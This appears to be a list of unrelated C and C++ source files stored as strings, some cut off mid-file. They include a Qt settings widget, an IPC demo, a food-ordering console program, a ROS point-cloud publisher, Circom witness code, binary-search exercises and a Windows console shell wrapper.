extern: \r\n2\r\n\r\n For more information on how extern variables work, have a look at this link.\r\n\r\n3. static Storage Class\r\nThe static storage class is used to declare static variables which are popularly used while writing programs in C++ language. Static variables have the property of preserving their value even after they are out of their scope! Hence, static variables preserve the value of their last use in their scope.\r\n\r\nWe can say that they are initialized only once and exist until the termination of the program. Thus, no new memory is allocated because they are not re-declared. Global static variables can be accessed anywhere in the program.\r\n\r\nProperties of static Storage Class\r\nScope: Local\r\nDefault Value: Zero\r\nMemory Location: RAM\r\nLifetime: Till the end of the program\r\nNote: Global Static variables can be accessed in any function.\r\n\r\nExample of static Storage Class\r\nC++\r\n\r\n// C++ program to illus",
    "#include \"preset.h\"\n#include \"ui_preset.h\"\n\nPreSet::PreSet(QWidget *parent) :\n    QWidget(parent),\n    ui(new Ui::PreSet)\n{\n    ui->setupUi(this);\n    data = new ISAJData();\n    Connections();\n}\n\nPreSet::~PreSet()\n{\n    delete ui;\n}\n\nvoid PreSet::LoadData()\n{\n    QString text;\n    preTableLoad(text);\n    this->setVisible(true);\n}\n\nvoid PreSet::preTableLoad(QString text)\n{\n    text = data->ReadData(LoadRow);\n    if(text != ISAJ_NULL)\n    {\n        Row = text.toInt();\n        ui->rowLine->setText(text);\n    }\n    else\n    {\n        Row = 72;\n        ui->rowLine->setText(\"72\");\n    }\n    text = data->ReadData(LoadColumn);\n    if(text != ISAJ_NULL)\n    {\n        Column = text.toInt();\n        ui->columnLine->setText(text);\n    }\n    else\n    {\n        Column = 2;\n        ui->columnLine->setText(\"2\");\n    }\n}\n\nvoid PreSet::SaveData()\n{\n    data->SaveData(LoadRow, ui->rowLine->text());\n    data->SaveData(LoadColumn, ui->columnLine->text());\n}\n\nvoid PreSet::Connections()\n{\n    connect(ui->okBtn, &QPushButton::clicked, this, [=](){SaveData();this->close();});\n    connect(ui->cancelBtn, &QPushButton::clicked, this, [=](){this->close();});\n}\n",
    "\n#include <signal.h>\n#include <string.h>\n#include <iostream>\n#include <atomic>\n#include <ipc/Ipc.h>\n\nnamespace {\n\nstd::atomic<bool> IsQuit { false };\nipc::Channel *Ipc = nullptr;\nuint16_t Count = 0;\n\nvoid do_send()\n{\n    ipc::Channel ipc {\"ipc\", ipc::SENDER};\n    Ipc = &ipc;\n    const std::string buffer {\"Hello,World!!!\"};\n    while (!IsQuit.load(std::memory_order_acquire))\n    {\n        if(Count++ >= 10)\n        {\n            break;\n        }\n        std::cout << \"write : \" << buffer << \"\\n\";\n        ipc.write(buffer + std::to_string(Count));\n    }\n}\n\nclass SendCallback : public ipc::Callback\n{\npublic:\n    virtual void message_arrived(const ipc::Buffer *buf /*msg*/) final{\n        std::cout << \"read size: \" << std::string((char*)buf->data(),buf->size()) << \"\\n\";\n    }\n};\n\nvoid do_recv()\n{\n    std::cout << \"Please Enter Ctrl + C to End.\" << std::endl;\n    ipc::Channel ipc {\"ipc\", ipc::RECEIVER};\n    ipc.set_callback(\n        std::dynamic_pointer_cast<ipc::Callback>(std::make_shared<SendCallback>()));\n    Ipc = &ipc;\n    ipc.read();\n}\n\n} // namespace\n\nint main(int argc, char ** argv)\n{\n    if (argc < 2)\n    {\n        return -1;\n    }\n    auto exit = [](int)\n    {\n        IsQuit.store(true, std::memory_order_release);\n        if (Ipc)\n        {\n            Ipc->disconnect();\n        }\n    };\n    ::signal(SIGINT  , exit);\n    ::signal(SIGABRT , exit);\n    ::signal(SIGSEGV , exit);\n    ::signal(SIGTERM , exit);\n#if defined(WIN64) || defined(_WIN64) || defined(__WIN64__) || \\\n    defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__) || \\\n    defined(WINCE) || defined(_WIN32_WCE)\n    ::signal(SIGBREAK, exit);\n#else\n    ::signal(SIGHUP  , exit);\n#endif\n\n    std::string mode {argv[1]};\n    if (mode == \"send\")\n    {\n        do_send();\n    }\n    else if (mode == \"recv\")\n    {\n        do_recv();\n    }\n    return 0;\n}\n\n// bool isAddressInBuff(void *addr, void *start, std::size_t size);\n \n// void printResult(const std::pmr::string &name, void *addr, bool isInBuff);\n\n// template<int N>\n// class alignas(alignof(std::max_align_t)) CacheTest\n// {\n// public:\n//     CacheTest(const char *data, std::size_t size)\n//         : count_ {0}\n//     {\n//         // memcpy(msg_.data(),data,size);\n//         std::cout << \"construct\" << std::endl;\n//     }\n//     ~CacheTest()\n//     {\n//         std::cout << \"destruct\" << std::endl;\n//     }\n// private:\n//     std::atomic<uint16_t> count_;\n//     std::array<char,N> msg_;\n// };\n  \n// void foo2() {\n//     unsigned char buff[1024]{};\n//     std::pmr::monotonic_buffer_resource pool(buff, 1024,\n//                                              std::pmr::null_memory_resource());\n    \n//     std::string value = \"Hello,World!!!\";\n//     CacheTest<100> *ca = std::pmr::polymorphic_allocator<CacheTest<100>>(&pool).allocate(1);\n//     std::pmr::polymorphic_allocator<CacheTest<100>>(&pool).construct(ca, value.c_str(),value.size());\n\n//      std::pmr::polymorphic_allocator<CacheTest<100>>(&pool).destroy(ca);\n//      std::pmr::polymorphic_allocator<CacheTest<100>>(&pool).deallocate(ca, 1);\n\n//     // std::pmr::monotonic_buffer_resource pool1(buff, 1024,\n//     //                                          std::pmr::null_memory_resource());\n//     // {\n//     // std::pmr::string s1{\"1111 \", &pool};\n//     //     printResult(\"string s1\", &s1, isAddressInBuff(&s1, buff, sizeof(buff)));\n//     // }\n//     // std::pmr::string s2{\"2222 \", &pool1};\n//     // printResult(\"string s2\", &s2, isAddressInBuff(&s2, buff, sizeof(buff)));\n\n\n//     // std::pmr::string s3{\"3333 \", &pool};\n//     // std::pmr::string &s4 = *new std::pmr::string{\"4444 \", &pool};\n//     // std::pmr::string &s5 = *new std::pmr::string{\"5555 \", &pool};\n//     // std::pmr::string &s6 = *new std::pmr::string{\"6666 \", &pool};\n//     // std::pmr::vector<std::pmr::string> vec{&pool};\n \n//     // std::pmr::unordered_map<int, std::pmr::string> map{&pool};\n//     // vec.push_back(s1);\n//     // vec.push_back(s2);\n//     // vec.push_back(s3);\n//     // map.insert({1, s1});\n//     // map.insert({2, s2});\n//     // map.insert({3, s3});\n \n//     // printResult(\"string s1\", &s1, isAddressInBuff(&s1, buff, sizeof(buff)));\n//     // printResult(\"string s2\", &s2, isAddressInBuff(&s2, buff, sizeof(buff)));\n//     // printResult(\"string s3\", &s3, isAddressInBuff(&s3, buff, sizeof(buff)));\n//     // printResult(\"string s4\", &s4, isAddressInBuff(&s4, buff, sizeof(buff)));\n//     // printResult(\"string s5\", &s5, isAddressInBuff(&s5, buff, sizeof(buff)));\n//     // printResult(\"string s6\", &s6, isAddressInBuff(&s6, buff, sizeof(buff)));\n \n//     // printResult(\"s1.c_str()\", (void *) s1.c_str(), isAddressInBuff((void *) s1.c_str(), buff, sizeof(buff)));\n//     // printResult(\"s2.c_str()\", (void *) s2.c_str(), isAddressInBuff((void *) s2.c_str(), buff, sizeof(buff)));\n//     // printResult(\"s3.c_str()\", (void *) s3.c_str(), isAddressInBuff((void *) s3.c_str(), buff, sizeof(buff)));\n//     // printResult(\"s4.c_str()\", (void *) s4.c_str(), isAddressI",
    "\n#include<stdio.h>\n#include<stdlib.h>\n#include<conio.h>\n#include<string.h>\n#include<windows.h>\n#include<time.h>\n\n\n\n\n   /// Update & Insert Function\nvoid insertfirst(int data, char foodname[25], int quantity, float price);\nvoid insertmid(int pos, int data, char foodname[25], int quantity, float price);\nvoid insertend(int data, char foodname[25], int quantity, float price);\nvoid updatefood(int udata, int uquantity);\n\n     /// Display Function\nvoid foodlist();\nvoid order_view(int order, int quantity, int or_no);\nvoid main_menu();\n\n    ///Delete \nvoid deletefood(int serial);\n\n ///START Structure Here\n\nstruct Node\n{\n\n\tchar foodname[50];\n\tint quantity;\n\tfloat price;\n\tint data;\n\tstruct Node *next;\n\n};\n\n   ///Global Type\n\ntypedef struct Node node ;\n\nnode *head, *list;\n\nint main()\n{\n\tint c=0; int any;\n\tint cardno[100];\n\tfloat cardmoney[100];\n\tfloat totalmoney = 0;\n\tint total_order[100];\n\tint order_quantity[100];\n\tint order=0;\n\tint uquantity;\n\tint citem;\n\tchar bur[] =\"Burger\";\n\tchar piz[] =\"pizza\";\n\tchar hot[] =\"hot cake\";\n\tchar cof[] =\"coffee\";\n\tchar ice[] =\"ice-cream\";\n\tchar sand[] =\"sandwich\";\n\tchar gri[] =\"grill\";\n\tchar nun[] =\"nun-bread\";\n\tchar cold[] =\"cold drinks\";\n\t\n\n\thead = NULL;\n\tinsertfirst(1,bur ,23,100);\n\tinsertend(2,piz,13,120);\n\tinsertend(3,hot,8,150);\n\tinsertend(4,cof,46,20);\n\tinsertend(5,ice,46,50);\n\tinsertend(6,sand,34,70);\n\tinsertend(7,gri,7,200);\n\tinsertend(8,nun,121,40);\n\tinsertend(9,cold,73,25);\n\n\tmainmenu:\n\n\tmain_menu();\n\n\tint main_menu_choice;\n\n fflush(stdin); \n scanf(\"%d\",&main_menu_choice);\n\n\tif((main_menu_choice >=1 && main_menu_choice <=3)){\n\n\t\tif(main_menu_choice == 1)\n\t\t{\n\n\t\t\tfoodlist:\n\n\t\t\t\n\t\t\tprintf(\"=> 0. Main Menu \");\n\t\t\tfoodlist();\n\n\n\t\t}\n\n\t\telse if( main_menu_choice == 2)\n\t\t{\n\n\t\t\tadminpanelchoice:\n\n\t\t\tint admin_panel_choice;\n\n\t\t\t     \n\t\t\tprintf(\"1. Main Menu\\n\\n\\t\"); \n\t\t\tprintf(\"Please Enter Password or ( 1 to Back in Main Menu ) : \");\n\n\n\t\t\tfflush(stdin);  \n\t\t\tscanf(\"%d\",&admin_panel_choice);\n\n\t\t\tif(admin_panel_choice==123321)\n\t\t\t{\n\n\n\n\t\t\t\tnode *temp;\n\n\t\t\t\ttemp = list;\n\n\t\t\t\tadminchoice:\n\n\t\t\t\t printf(\"You are on Admin Pannel\\n\\n\");\n\t\t\t\t\n\t\t\t\tprintf(\" 1. Total Cash Today \\n\\n\");\n\t\t\t\tprintf(\" 2. View Card Pay \\n\\n\");\n\t\t\t\tprintf(\" 3. Add Food \\n\\n\");\n\t\t\t\tprintf(\" 4. Delete Food \\n\\n\");\t\t\t\n\t\t\t\tprintf(\" 5. Instant Food List \\n\\n\");\n\t\t\t\tprintf(\" 6. Main Menu \\n\\n\");\n\t\t\t\tprintf(\"Enter Your From 1-6: \");\n\t\t\t\n\n\t\t\t\tint adminchoice;\n\n\n\n\t\t\t\tfflush(stdin);   scanf(\"%d\",&adminchoice);\n\n\t\t\t\tif(adminchoice==1){\n\n\t\t\t\t   printf(\"Todays Total Cash : %0.2f  \\n\",totalmoney);\n\n\t\t\n\n\t\t\t\t\tgoto adminchoice;\n\t\t\t\t}\n\t\t\t\telse if(adminchoice==2)\n\t\t\t\t{\n\n\t\t\t\t\tif(c!=0)\n\t\t\t\t\t{\n\n\t\t\n\n\t\t\t\t\t\tprintf(\" ____________________________\\n\");\n\t\t\t\t\t\tprintf(\"|   Card NO.   |   Money $   |\\n\");\n\t\t\t\t\t\tprintf(\"------------------------------\\n\");\n\n\t\t\t\t\t\tfor(int z=1; z<=c;z++){\n\n\t\t\t\t\t\t\tprintf(\"|  %d  | %0.2f |\\n\",cardno[z],cardmoney[z]);\n\t\t\t\t\t\t\tprintf(\"------------------------------\\n\");\n\t\t\t\t\n\n\t\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t}\n\n\t\t\t\t\tif(c==0){\n\n\t\t\t\t\n\t\t\t\t\tprintf(\"No Card History\\n\");}\n\t\t\t\t\n\t\t\t\t\tgoto adminchoice;\n\t\t\t\t}\n\n\t\t\t\telse if(adminchoice==3){\n\n\t\t\t\t\tfoodadd:\n\t\t\t\t\n\n\t\t\t\t\tchar ffoodname[25];\n\t\t\t\t\tint fquantity;\n\t\t\t\t\tint fdata;\n\t\t\t\t\tfloat fprice;\n\t\t\t\t\tint fposi;\n\n\n\t\t\t\t      printf(\" \\nEnter Food Name :  \");\n\n\t\t\t\t\tfflush(stdin);    \n\t\t\t\t\t scanf(\"%[^\\n]s\",ffoodname);\n\t\t\t\t\tfquantity:\n\t\t\t\t\tfflush(stdin);\n\n\t\t\t\t\n\t\t\t\t\tprintf(\" \\nEnter Food Quantity :  \");\n\n\t\t\t\t\tscanf(\"%d\",&fquantity); fflush(stdin);\n\n                        foodserial:\n\t\t\t\t  printf(\" \\nEnter Food Serial :  \");\n                      scanf(\"%d\",&fdata);\n                            node *exist;\n                            exist = list;\n                      while(exist->data!=fdata){\n                            if(exist->next==NULL){\n                                break;\n                            }\n                        exist=exist->next;\n                      }\n                      if(exist->data==fdata){\n                     printf(\"\\n Food Serial Already Exist, Please Re-Enter  \"); Sleep(2000);\n                       goto foodserial;\n                      }\n\n                    fprice:\n                      fflush(stdin);\n\n\t\t\t\t printf(\"\\n Enter Food Price :  \");fflush(stdin);\n\n\t\t\t\t\tscanf(\"%f\",&fprice);\n\n\n\n\t\t\t\t\t printf(\"Submiting your data\");for(int cs=0;cs<4;cs++){printf(\" .\");Sleep(500);}\n\n\n\t\t\t\t\tinsertend(fdata,ffoodname,fquantity,fprice);\n\n\t\t\t\t     printf(\"Adding Food  Successfull....\\n\");\n\n\t\t\t\t\t\n\n\t\t\t\t\tgoto adminchoice;\n\n\t\t\t\t}\n\t\t\t\telse if(adminchoice==4){\n\n\t\t\t\t\n\t\t\t\t\tprintf(\"Enter Serial No of the Food To Delete : \");\n\t\t\t\t\tfdelete:\n\t\t\t\t\tint fdelete;\n\t\t\t\t\tfflush(stdin); scanf(\"%d\",&fdelete);\n\t\t\t\t\tnode *temp;\n\t\t\t\t\ttemp=list;\n\t\t\t\t\twhile(temp->data != fdelete){\n\t\t\t\t\t\ttemp = temp->next;\n\t\t\t\t\t}\n\t\t\t\t\tif(temp->data==fdelete){\n\t\t\t\t\t\tdeletefood(fdelete);\n\t\t\t\t\t}\n\t\t\t\t\telse{\n\t\t\t\t\t printf(\"Please Enter Correct Number :  \"); Sleep(500);\n\t\t\t\t\t\tgoto fdelete;\n\t\t\t\t\t}\n\n\n\t\t\t\t\tgoto adminchoice;\n\t\t\t\t}\n\n\t\t\t\telse if(adminchoice==5)\n\t\t\t\t{\n\n\t\t\t\t\t\n\t\t\t\t\t    foodlist(); \n\t\t\t\t\t\t\n\n\t\t\t\t\t  printf(\"1. <-- back  \\n\\n\");\n\n\n\n",
    "/***********************************************************************\n * Source File:\n *    VELOCITY\n * Author:\n *    Br. Helfrich\n * Summary:\n *    Everything we need to know about speed\n ************************************************************************/ \n\n#include \"velocity.h\"\n#include \"acceleration.h\"\n#include \"angle.h\"\n\n#include <math.h>  // for sqrt()\n\n /*********************************************\n  * VELOCITY : ADD\n  *  v = v_0 + a t\n  *********************************************/\nvoid Velocity::add(const Acceleration& acceleration, double time)\n{\n   dx += acceleration.getDDX() * time;\n   dy += acceleration.getDDY() * time;\n}\n\n/*********************************************\n * VELOCITY : GET SPEED\n *  find the magnitude of velocity\n *********************************************/\ndouble Velocity::getSpeed() const\n{\n   return sqrt(dx * dx + dy * dy);\n}\n\n/*********************************************\n * VELOCITY : SET\n *  set from angle and direction\n *********************************************/\nvoid Velocity::set(const Angle& angle, double magnitude)\n{\n   dx = sin(angle.getRadians()) * magnitude;\n   dy = cos(angle.getRadians()) * magnitude;\n}",
    "#include <ros/ros.h>\n#include <sensor_msgs/PointCloud2.h>\n#include <pcl/point_cloud.h>\n#include <pcl/point_types.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <dirent.h>\n#include <algorithm>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <fstream>\n#include <iostream>\n\n// Function to get sorted list of bin files in the directory\nstd::vector<std::string> getSortedBinFiles(const std::string& directory) {\n    std::vector<std::string> files;\n    struct dirent* entry;\n    DIR* dp = opendir(directory.c_str());\n    \n    if (dp == nullptr) {\n        perror(\"opendir\");\n        return files;\n    }\n\n    while ((entry = readdir(dp))) {\n        std::string filename = entry->d_name;\n        if (filename.find(\".bin\") != std::string::npos) {\n            files.push_back(filename);\n        }\n    }\n\n    closedir(dp);\n\n    std::sort(files.begin(), files.end(), [](const std::string& a, const std::string& b) {\n        int num_a = std::stoi(a.substr(0, a.find(\".bin\")));\n        int num_b = std::stoi(b.substr(0, b.find(\".bin\")));\n        return num_a < num_b;\n    });\n\n    return files;\n}\n\n// Function to load a bin file into a PCL point cloud\npcl::PointCloud<pcl::PointXYZI>::Ptr loadBinFile(const std::string& file_path) {\n    std::ifstream input(file_path.c_str(), std::ios::binary);\n    if (!input) {\n        std::cerr << \"Cannot open file: \" << file_path << std::endl;\n        return nullptr;\n    }\n\n    pcl::PointCloud<pcl::PointXYZI>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZI>);\n    pcl::PointXYZI point;\n\n    while (input.read(reinterpret_cast<char*>(&point), sizeof(pcl::PointXYZI))) {\n        cloud->push_back(point);\n    }\n\n    input.close();\n    return cloud;\n}\n\nint main(int argc, char** argv) {\n    ros::init(argc, argv, \"bin2topic\");\n    \n    ros::NodeHandle nh;\n\n    std::string directory;\n    double delta_time_sec;\n    std::string frame_id;\n    std::string topic_name;\n\n    nh.param<std::string>(\"bin2topic/directory\", directory, \".\");\n    nh.param<std::string>(\"bin2topic/frame_id\", frame_id, \"base_link\");\n    nh.param<double>(\"bin2topic/delta_time_sec\", delta_time_sec, 1.0);\n    nh.param<std::string>(\"bin2topic/topic_name\", topic_name, \"bin2topic/pointcloud\");\n\n    // Print parameters\n    ROS_INFO_STREAM(\"Directory: \" << directory);\n    ROS_INFO_STREAM(\"Frame ID: \" << frame_id);\n    ROS_INFO_STREAM(\"Delta Time (sec): \" << delta_time_sec);\n    ROS_INFO_STREAM(\"Topic Name: \" << topic_name);\n\n    ros::Publisher pub = nh.advertise<sensor_msgs::PointCloud2>(topic_name, 1);\n\n    std::vector<std::string> bin_files = getSortedBinFiles(directory);\n\n    ros::Rate rate(1.0 / delta_time_sec);\n\n    for (const auto& bin_file : bin_files) {\n        if (!ros::ok()) break;\n\n        std::string file_path = directory + \"/\" + bin_file;\n        pcl::PointCloud<pcl::PointXYZI>::Ptr cloud = loadBinFile(file_path);\n\n        if (cloud) {\n            sensor_msgs::PointCloud2 output;\n            pcl::toROSMsg(*cloud, output);\n            output.header.frame_id = frame_id;\n            output.header.stamp = ros::Time::now();\n            pub.publish(output);\n            ROS_INFO_STREAM(\"Published \" << bin_file);\n        }\n\n        rate.sleep();\n    }\n\n    return 0;\n}\n",
    "#include <iomanip>\n#include <sstream>\n#include <assert.h>\n#include \"calcwit.hpp\"\n\nextern void run(Circom_CalcWit* ctx);\n\nstd::string int_to_hex( u64 i )\n{\n  std::stringstream stream;\n  stream << \"0x\"\n         << std::setfill ('0') << std::setw(16)\n         << std::hex << i;\n  return stream.str();\n}\n\nu64 fnv1a(std::string s) {\n  u64 hash = 0xCBF29CE484222325LL;\n  for(char& c : s) {\n    hash ^= u64(c);\n    hash *= 0x100000001B3LL;\n  }\n  return hash;\n}\n\nCircom_CalcWit::Circom_CalcWit (Circom_Circuit *aCircuit, uint maxTh) {\n  circuit = aCircuit;\n  inputSignalAssignedCounter = get_main_input_signal_no();\n  inputSignalAssigned = new bool[inputSignalAssignedCounter];\n  for (int i = 0; i< inputSignalAssignedCounter; i++) {\n    inputSignalAssigned[i] = false;\n  }\n  signalValues = new FrElement[get_total_signal_no()];\n  Fr_str2element(&signalValues[0], \"1\", 10);\n  componentMemory = new Circom_Component[get_number_of_components()];\n  circuitConstants = circuit ->circuitConstants;\n  templateInsId2IOSignalInfo = circuit -> templateInsId2IOSignalInfo;\n\n  maxThread = maxTh;\n\n  // parallelism\n  numThread = 0;\n\n}\n\nCircom_CalcWit::~Circom_CalcWit() {\n  // ...\n}\n\nuint Circom_CalcWit::getInputSignalHashPosition(u64 h) {\n  uint n = get_size_of_input_hashmap();\n  uint pos = (uint)(h % (u64)n);\n  if (circuit->InputHashMap[pos].hash!=h){\n    uint inipos = pos;\n    pos = (pos+1)%n; \n    while (pos != inipos) {\n      if (circuit->InputHashMap[pos].hash == h) return pos;\n      if (circuit->InputHashMap[pos].signalid == 0) {\n\tfprintf(stderr, \"Signal not found\\n\");\n\tassert(false);\n      }\n      pos = (pos+1)%n; \n    }\n    fprintf(stderr, \"Signals not found\\n\");\n    assert(false);\n  }\n  return pos;\n}\n\nvoid Circom_CalcWit::tryRunCircuit(){ \n  if (inputSignalAssignedCounter == 0) {\n    run(this);\n  }\n}\n\nvoid Circom_CalcWit::setInputSignal(u64 h, uint i,  FrElement & val){\n  if (inputSignalAssignedCounter == 0) {\n    fprintf(stderr, \"No more signals to be assigned\\n\");\n    assert(false);\n  }\n  uint pos = getInputSignalHashPosition(h);\n  if (i >= circuit->InputHashMap[pos].signalsize) {\n    fprintf(stderr, \"Input signal array access exceeds the size\\n\");\n    assert(false);\n  }\n  \n  uint si = circuit->InputHashMap[pos].signalid+i;\n  if (inputSignalAssigned[si-get_main_input_signal_start()]) {\n    fprintf(stderr, \"Signal assigned twice: %d\\n\", si);\n    assert(false);\n  }\n  signalValues[si] = val;\n  inputSignalAssigned[si-get_main_input_signal_start()] = true;\n  inputSignalAssignedCounter--;\n  tryRunCircuit();\n}\n\nu64 Circom_CalcWit::getInputSignalSize(u64 h) {\n  uint pos = getInputSignalHashPosition(h);\n  return circuit->InputHashMap[pos].signalsize;\n}\n\nstd::string Circom_CalcWit::getTrace(u64 id_cmp){\n  if (id_cmp == 0) return componentMemory[id_cmp].componentName;\n  else{\n    u64 id_father = componentMemory[id_cmp].idFather;\n    std::string my_name = componentMemory[id_cmp].componentName;\n\n    return Circom_CalcWit::getTrace(id_father) + \".\" + my_name;\n  }\n\n\n}\n\nstd::string Circom_CalcWit::generate_position_array(uint* dimensions, uint size_dimensions, uint index){\n  std::string positions = \"\";\n\n  for (uint i = 0 ; i < size_dimensions; i++){\n    uint last_pos = index % dimensions[size_dimensions -1 - i];\n    index = index / dimensions[size_dimensions -1 - i];\n    std::string new_pos = \"[\" + std::to_string(last_pos) + \"]\";\n    positions =  new_pos + positions;\n  }\n  return positions;\n}\n\n",
    "#include<iostream>\n#include<vector>\nusing namespace std;\n\nint binarysearch(vector<int> &arr, int target){\n  int n =  arr.size();\n  int start = 0;\n  int last = n-1;\n\n\n  while(start<=last){\n    int midPoint = start + ((last - start)/2);\n    if(arr[midPoint]==target) return midPoint;\n    else if (arr[midPoint]< target){\n      start = midPoint + 1;\n    }\n    else{\n      last = midPoint - 1;\n    }\n  }\n  return -1;\n\n}\n\nint binarysearchRecursion(vector<int> &arr, int target, int start, int last){\n  if(start>last) return -1;\n\n  int midPoint = start + ((last - start)/2);\n\n  if(arr[midPoint]==target) return midPoint;\n\n  else if (arr[midPoint]<target){\n    return binarysearchRecursion(arr, target, midPoint+1, last);\n  }\n\n  else{\n    return binarysearchRecursion(arr, target, start, midPoint-1);\n    }\n\n}\n\nint firstOccurence(vector<int> &arr, int target){\n  int n =  arr.size();\n  int start = 0;\n  int last = n-1;\n  int result = -1;\n\n  while(start<=last){\n    int midPoint = start + ((last - start)/2);\n    if(arr[midPoint]==target){\n      result = midPoint;\n      last = midPoint-1;\n    }\n    else if(arr[midPoint]<target){\n      start = midPoint + 1;\n    }\n    else\n      last = midPoint - 1;\n  }\n  return result;\n}\n\nint squareRoot(int x){\n  int start = 1; int last = x;\n  int result = -1;\n\n  while(start<=last){\n    int midPoint = start + ((last - start)/2);\n    if(midPoint * midPoint <= x){\n      result = midPoint;\n      start = midPoint + 1;\n    }\n    else{\n      last = midPoint - 1;\n    }\n  }\n  return result;\n}\n\nint lowerBond(vector<int> &arr, int target){\n  int n = arr.size();\n  int start = 0;\n  int last = n-1;\n  int ans = -1;\n\n  while(start <= last){\n    int midPoint = start + ((last - start)/2);\n    if(arr[midPoint] >= target){\n      ans = midPoint;\n      last = midPoint - 1;\n    }\n    else{\n      start = midPoint + 1;\n    }\n  }\n  return ans;\n}\n\nint upperBond(vector<int> &arr, int target){\n  int n = arr.size();\n  int start = 0;\n  int last = n-1;\n  int ans = -1;\n\n  while(start <= last){\n    int midPoint = start + ((last - start)/2);\n    if(arr[midPoint] > target){\n      ans = midPoint;\n      last = midPoint - 1;\n    }\n    else{\n      start = midPoint + 1;\n    }\n  }\n  return ans;\n}\n\nint main()\n{\n  int n;\n  cin>>n;\n\n  vector<int> arr(n);\n  for(int i=0; i<n; i++){\n    cin>>arr[i];\n  }\n  int target;\n  cin>> target;\n\n  vector<int> res;\n  int low = lowerBond(arr, target);\n  if(arr[low] != target ){\n    res.push_back(-1);\n    res.push_back(-1);\n  }\n  else{\n    int ub = upperBond(arr, target);\n    res.push_back(low);\n    res.push_back(ub-1);\n  }\n\n  // cout<<binarysearch(arr, target);\n  // cout<<binarysearchRecursion(arr, target, 0, n-1);\n  // cout<<firstOccurence(arr, target);\n  // cout<<squareRoot(40)<<\"\\n\";\n  cout<<\"{\"<<res[0]<<\" \"<<res[1]<<\"}\"<<endl;\n\n  return 0;\n}\n",
    "\ufeff// AdvanceConsole.cpp : \u6b64\u6587\u4ef6\u5305\u542b \"main\" \u51fd\u6570\u3002\u7a0b\u5e8f\u6267\u884c\u5c06\u5728\u6b64\u5904\u5f00\u59cb\u5e76\u7ed3\u675f\u3002\n//\n\n#include<Windows.h>\n#include<cstdio>\n#include <iostream>\n#include<cstring>\n#include<vector>\n#include<exception>\n#include<algorithm>\n#include<Objbase.h>\n#include<wincred.h>\n\n#include \"common.h\"\n\nusing namespace std;\n\n#pragma comment (lib, \"credui.lib\")\n\n//\n//Global Varierables\n//\nstatic long globalType = 0;\n\n\n\n//\n//Initalize Funcation\n//\nBOOL checkArguments() {\n    return FALSE;\n}\nconst CHAR* cszTitle = \"Advance Console 0.0.1 Prerelease\";\nBOOL initOutput() {\n    const CHAR* cszNoArgu = \"No command arguments.\", * cszCopyright = \"Copyright Love-Code-Yeyixiao\";//,*cszLicense=\"You are now not allowed to recompile, use or distribute the application after modifying the source code.\";\n\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), BACKGROUND_RED);\n    for (int i = 0; i <= 10; i++)\n        printf(\"                                                                                          \");\n    cout.flush();\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | BACKGROUND_RED);\n    system(\"cls\");\n\n    cout << cszTitle << endl;\n    BOOL isArgument = checkArguments();\n    if (!isArgument) {\n        cout << cszNoArgu<<endl;\n        globalType = 1;\n    }\n    cout << cszCopyright << endl  /*<< cszLicense << endl*/;\n    return TRUE;\n}\nBOOL init() {\n    BOOL status = TRUE;\n    status=initOutput();\n    SetConsoleTitleA(cszTitle);\n    return status;\n}\n\n\n\n//\n//DefaultWork\n//\nvector<string> vctCmd;\nBOOL isPraseSuccess = FALSE;\nchar inputBuf[2560] = { 0 };\nvoid LogOutput(ULONG uCode) {\n\n}\nvoid errorGrammar()\n{\n    cout << \"Command usage syntax error!\" << endl;\n    \n}\nvoid errorE2Big() {\n    cout << \"The list of independent variables is too large\"<<endl;\n}\nvoid errorNotFound() {\n    if (inputBuf!=NULL)\n        cout<< \"'\" << inputBuf << \"'\" << \" is not an internal or external command, nor is it a runnable program or a batch file\" << endl;\n}\nvoid errorNoCmd() {\n    cout << \"Can't find system CMD!\";\n}\nvoid ErrorTip(ULONG uCode) {\n    if (uCode == 1000) {\n        errorGrammar();\n    }\n    else if (uCode == 1001) {\n        errorNotFound();\n    }\n    else if (uCode == 1003) {\n        errorE2Big();\n    }\n    else if (uCode == 1004) {\n        errorNoCmd();\n    }\n    LogOutput(uCode);\n}\nvoid PraseCDAndExecute() {\n    string path = vctCmd[1];\n    //if (GetCharNumberOfString(path, \".\") == vctCmd[1].length())\n    if (SetCurrentDirectoryA(path.c_str()) == 0)\n        cout << \"Failed to change Current Directory!\"<<endl;\n    \n}\nBOOL DefaultWork() {\n    BOOL state = TRUE;\n    cout << \"Welcome to Default State of the application.\" << endl << \"Use \\\"Help\\\" to view command help.\" << endl/* << \"Input \\\"ChangeMode n\\\" to set console mode\" << endl*/;\n    char buf[MAX_PATH+1] = { 0 };\n    \n    while (TRUE) {\n        memset(inputBuf, 0, 2560);\n        vctCmd.clear();\n        GetCurrentDirectoryA(MAX_PATH, buf);\n        cout << buf << \">\";\n        cin.getline(inputBuf, 2560);\n        StringSplit(inputBuf, ' ', vctCmd);\n        if (vctCmd.empty()) {\n            continue;\n        }\n        /*if (_strcmpi(\"cd\", vctCmd[0].c_str()) == 0) {\n            isPraseSuccess = TRUE;\n            if (vctCmd.size() != 2) {\n                isPraseSuccess = FALSE;\n                ErrorTip(1000);\n            }\n            else {\n                PraseCDAndExecute();\n            }\n        }\n        else if(_strcmpi(inputBuf,\"cls\")==0) {\n            isPraseSuccess = TRUE;\n            system(\"cls\");\n        }\n        else if (_strcmpi(inputBuf, \"dir\") == 0) {\n            isPraseSuccess = TRUE;\n            system(\"dir\");\n        }\n        else if (_strcmpi(inputBuf, \"ver\") == 0) {\n            isPraseSuccess = TRUE;\n            WinExec(\"winver.exe\", SW_SHOW);\n        }\n        else if (_strcmpi(\"start\", vctCmd[0].c_str()) == 0) {\n            isPraseSuccess = TRUE;\n            string tmpBuf = inputBuf;\n            string tmpBuf2 = \"start \";\n            transform(tmpBuf.begin(), tmpBuf.end(), tmpBuf.begin(), tolower);\n            WinExec(tmpBuf.replace(tmpBuf.find(tmpBuf2), 1, \"\").data(), SW_SHOW);\n        }\n        else if (_strcmpi(\"color\", vctCmd[0].c_str()) == 0) {\n            isPraseSuccess = TRUE;\n            system(inputBuf);\n        }*/\n        if (_strcmpi(\"cd\", vctCmd[0].c_str()) == 0) {\n            isPraseSuccess = TRUE;\n            if (vctCmd.size() != 